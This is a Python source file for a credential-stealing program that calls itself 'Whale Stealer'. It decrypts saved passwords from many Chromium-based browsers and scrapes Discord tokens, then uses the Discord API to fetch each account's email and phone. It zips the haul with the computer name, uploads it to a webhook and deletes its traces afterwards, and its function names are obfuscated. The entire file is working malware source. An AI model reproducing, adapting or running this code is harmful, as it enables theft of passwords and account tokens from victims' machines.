import base64
import json
import os
import shutil
import sqlite3
import re
import requests
import socket
import zipfile
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData



appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    }
}

def MXHDXKXMB(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def M1HD2K3MB(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def M3HD2K3MB(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    output_file_path = f'{browser_name}/passwords.json'
    if isinstance(content, str) and content.strip():
        lines = content.strip().split('\n\n')
        with open(output_file_path, 'w', encoding="utf-8") as f:
            data_list = []
            for line in lines:
                lines_split = line.strip().split('\n')
                data = {
                    "type": type_of_data.replace("login_data","Passwords - Whale Stealer - t.me/whalestealer"),
                    "url": lines_split[0].replace("URL: ", ""),
                    "email": lines_split[1].replace("Email: ", ""),
                    "password": lines_split[2].replace("Password: ", "")
                }
                if all(value != "" for value in data.values()):
                    data_list.append(data)
            if data_list:
                json.dump(data_list, f, indent=4)

def M3HD4K3MB(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = M1HD2K3MB(row[i], key)
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def M3HD4K6MB(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def M9HD4K6MB():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

def M9HD1K6MB(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
            for line in f:
                matches = re.findall(r'[A-Za-z\d]{26}\.[\w-]{6}\.[\w-]{38}', line)
                if matches:
                    for match in matches:
                        tokens.append(match)
                matches_mfa = re.findall(r'mfa\.[\w-]{84}', line)
                if matches_mfa:
                    for match in matches_mfa:
                        tokens.append(match)
    return tokens

def M9HD1K1MB(token):
    headers = {
        'Authorization': token
    }
    response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if response.status_code == 200:
        user_data = response.json()
        username = user_data.get('username')
        phone = user_data.get('phone')
        email = user_data.get('email')
        return username, phone, email
    else:
        return None, None, None

def main():
    available_browsers = M9HD4K6MB()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = MXHDXKXMB(browser_path)

        for data_type_name, data_type in data_queries.items():
            data = M3HD4K3MB(browser_path, "Default", master_key, data_type)
            M3HD2K3MB(browser, data_type_name, data)

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': appdata + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        tokens = M9HD1K6MB(path)

        if tokens:
            token_info = []
            for token in tokens:
                username, phone, email = M9HD1K1MB(token)
                if username:
                    token_info.append({
                        "type": "Tokens - Whale Stealer - t.me/whalestealer",
                        "token": {
                            "username": username if username else "Username not found",
                            "token": token,
                            "phone": phone if phone else "Phone number not found",
                            "email": email if email else "Email not found"
                        }
                    })
                else:
                    token_info.append({
                        "type": "Tokens - Whale Stealer - t.me/whalestealer",
                        "token": {
                            "username": username if username else "Username not found",
                            "token": token,
                            "phone": phone if phone else "Phone number not found",
                            "email": email if email else "Email not found"
                        }
                    })

            with open(f'discordtokens.json', 'w') as f:
                json.dump(token_info, f, indent=4)

if __name__ == '__main__':
    main()



def M1HD1K2MB():
    json_directory = os.getcwd()

    zip_file_name = "whale.zip"

    with zipfile.ZipFile(zip_file_name, 'w') as whale_zip:
        for foldername, subfolders, filenames in os.walk(json_directory):
            for filename in filenames:
                if filename.endswith('.json'):
                    file_path = os.path.join(foldername, filename)
                    whale_zip.write(file_path, os.path.relpath(file_path, json_directory))

    destination_directory = os.path.join(json_directory, "whale")
    os.makedirs(destination_directory, exist_ok=True)
    shutil.move(zip_file_name, os.path.join(destination_directory, zip_file_name))

    return os.path.join(destination_directory, zip_file_name)

def M6HD6K6MB():
    json_directory = os.getcwd()

    for foldername, subfolders, filenames in os.walk(json_directory):
        for filename in filenames:
            if filename.endswith('.json'):
                file_path = os.path.join(foldername, filename)
                os.remove(file_path)

def M3HD2K1MB():
    json_directory = os.getcwd()

    for foldername in os.listdir(json_directory):
        if os.path.isdir(foldername) and foldername != "whale":
            shutil.rmtree(foldername, ignore_errors=True)


def M3HD2K7MB():
    try:
        computer_name = socket.gethostname()
        return computer_name
    except:
        return None

def send_via_webhook(webhook_url, zip_file_path=None):
    computer_name = M3HD2K7MB()
    if computer_name:
        message = "PC: " + computer_name
    else:
        message = "Computer name not found."
    try:
        if zip_file_path:
            with open(zip_file_path, 'rb') as f:
                files = {'file': (os.path.basename(zip_file_path), f)}
                response = requests.post(webhook_url, data={"content": message}, files=files)
                pass
        else:
            response = requests.post(webhook_url, json={"content": message})
            pass
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        pass

def M9HD3K9MB(dosya_yolu, klasor_yolu):
    try:
        os.remove(dosya_yolu)
        pass
    except OSError as dosya_hata:
        pass
    
    try:
        shutil.rmtree(klasor_yolu)
        print("")
    except OSError as klasor_hata:
        pass

dosya_yolu = "whale.zip"
klasor_yolu = "whale"

if __name__ == "__main__":
    webhook_url = ""
    M1HD1K2MB()
    zip_file_path = M1HD1K2MB()
    send_via_webhook(webhook_url, zip_file_path)
    M6HD6K6MB()
    M3HD2K1MB()
    M9HD3K9MB(dosya_yolu, klasor_yolu)